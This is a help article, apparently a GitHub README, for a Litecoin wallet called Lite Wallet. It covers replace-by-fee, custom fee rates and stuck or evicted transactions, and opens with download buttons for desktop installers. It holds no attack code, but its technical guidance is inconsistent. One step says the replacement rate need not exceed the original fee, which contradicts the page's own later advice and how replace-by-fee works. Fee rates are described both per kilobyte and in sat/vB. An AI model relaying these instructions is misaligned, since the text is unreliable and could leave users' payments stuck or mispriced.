![Lite Wallet](assets/banner-article.png)

# Replace-by-fee: speed up a stuck Litecoin send

Replacing a stuck send, and what the second fee really costs.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-2578D1?style=for-the-badge&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-2578D1?style=for-the-badge&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-2578D1?style=flat-square&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-2578D1?style=flat-square&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

A transaction that has not confirmed can be re-sent at a higher fee so the network prefers the new version. Litecoin supports replace-by-fee (RBF), and Lite Wallet lets you set a custom fee rate before sending. The combination is how you fix a send that is stuck at the bottom of the mempool.

## Why a send gets stuck

A transaction sits in the mempool until a miner includes it. Miners pick by fee rate, so a transaction paying well below the going rate can wait hours while better-paying ones jump ahead. Nothing is lost, and nothing is wrong with the wallet - the send is simply not competitive. How the wallet sets a rate at send time is covered in [the fees guide](https://github.com/litewallet-dev/litecoin-wallet-transactions/blob/main/litewallet-fees-and-replace-by-fee.md).

Three situations produce it:

- a fee level chosen too low during a busy period
- a wallet spending many small inputs, which makes the transaction large and the fee-per-byte poor
- a rate that was reasonable when you signed and cheap when the mempool filled

The transaction hash stays valid while it waits. Until it confirms or is replaced, the coins are committed and cannot be spent again from the wallet.

## Setting a fee rate before you send

The send screen offers fee levels and, in the advanced fee area, a custom rate. Choosing a rate means choosing a priority: the figure is per kilobyte of transaction size, so a large transaction costs more at the same rate.

| Level | Behaviour | When to use |
|---|---|---|
| cheapest | may wait a long time | nothing time-critical |
| default | included within a block or two | normal sends |
| high | next-block priority | time-sensitive payments |
| custom | your figure, your risk | when you know the current rate |

A common mistake is treating the fee amount as fixed when it is a rate. Setting "1 sat/vB" is meaningful; setting "0.0001 LTC" is not a rate, because it is applied to a size you have not measured.

## When RBF is available

Replacement requires two conditions: the original transaction must have been signed as replaceable, and it must still be unconfirmed. A transaction already mined cannot be replaced, and one signed without the replaceable flag cannot be bumped - the only recourse there is to wait.

| State of the send | Can it be replaced |
|---|---|
| unconfirmed, replaceable | yes, at a higher fee |
| unconfirmed, not replaceable | no - wait or contact the recipient |
| confirmed | no |
| dropped from the mempool | the coins free up; send again |

That second row is worth knowing before it matters. If you might need to speed a payment up, send it replaceable from the start rather than discovering the limitation when a payment is late.

## How to replace a stuck transaction

1. Find the pending transaction in the wallet's history.
2. Confirm it is still unconfirmed on a block explorer.
3. Choose the replace or bump-fee action, or re-send the same payment at a higher rate.
4. Set a rate above the current mempool floor, not above your original.
5. Sign and broadcast the replacement.
6. Confirm the replacement is accepted and the original is gone from the mempool.

The last step matters: a replacement that pays only marginally more can fail to propagate, leaving two versions where miners pick the original. Overshoot slightly rather than exactly matching the floor.

## What a replacement costs

You pay the new fee, and the difference between the two fees is the real cost of the exercise. The original fee is not refunded, so a replacement is always more expensive than having picked the right level first.

| | Original send | Replacement |
|---|---|---|
| fee paid | the first fee | the second, higher fee |
| recipient amount | unchanged | unchanged |
| net extra cost | - | roughly the fee difference |

This is why the cheap-fee-and-fix-later strategy is a false economy for anything that matters. It only saves money when the send was never urgent.

## When not to replace

Do not replace if the recipient has already been told the payment is on its way and the delay is acceptable, and do not replace a transaction whose fee was already competitive - you will pay twice for the same inclusion.

Do not replace at all if the send went to the wrong address. A replacement cannot change the destination; it only re-prices the same payment. Speed is not the problem in that case, and no amount of fee fixes a wrong recipient.

## Preventing the next one

Three habits remove most stuck sends: use the default rate unless you have a reason not to, avoid spending a wallet full of tiny inputs during busy periods, and consolidate small coins when fees are cheap. [The fees guide](https://github.com/litewallet-dev/litecoin-wallet-transactions/blob/main/litewallet-fees-and-replace-by-fee.md) explains how transaction size drives the fee, and [the send and receive guide](https://github.com/litewallet-dev/litecoin-wallet-transactions/blob/main/how-to-send-litecoin-with-litewallet.md) covers the send screen itself.

If the transaction disappears entirely rather than confirming, the cause is usually a mempool eviction, and the coins become spendable again. [The missing transaction guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-transaction-stuck-or-missing.md) covers that case.

## What the mempool is, briefly

The mempool is the waiting room. Every node keeps its own copy of unconfirmed transactions, miners select from it by fee rate, and a transaction leaves it in one of two ways: a block includes it, or it is evicted because it has been waiting too long or the node's memory pressure pushed it out.

That explains the behaviour people find strange. A transaction can be visible on one explorer and absent from another, because explorers run different nodes with different waiting rooms. A transaction can sit for hours and then vanish, which is eviction rather than cancellation. And a replacement can appear alongside the original for a while, because nodes learn about the new version at different moments.

For practical purposes, three facts follow. Unconfirmed means not yet in a block, regardless of how it looks in the wallet. A fee below the current floor means waiting, not failing. And a send that disappears from every explorer has been dropped, which returns the coins to spendable without any action from you.

Reading the explorer rather than the wallet's spinner is the habit that makes all of this legible. The wallet is a view; the chain and the mempool decide what is true, and the two disagree routinely during busy periods.

## FAQ

### Does Lite Wallet support RBF?

Yes. A replaceable unconfirmed send can be re-issued at a higher fee, and the wallet supports setting a custom rate when you send.

### Can I set a custom fee rate?

Yes, in the advanced fee area of the send screen. The figure is a rate per kilobyte of transaction size, so a larger transaction costs more at the same setting.

### How do I replace a stuck transaction?

Find the pending send, confirm it is still unconfirmed, then replace it at a rate above the current mempool floor. Sign and broadcast, then confirm the original is gone.

### Can I replace a transaction that already confirmed?

No. Once a transaction is mined it is final. Replacement is only possible while it is unconfirmed and was signed as replaceable.

### What if my transaction was signed as non-replaceable?

Then it cannot be bumped. Wait for it to confirm or be evicted from the mempool; the coins are committed until one of those happens.

Fee controls described here match the current release, published on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
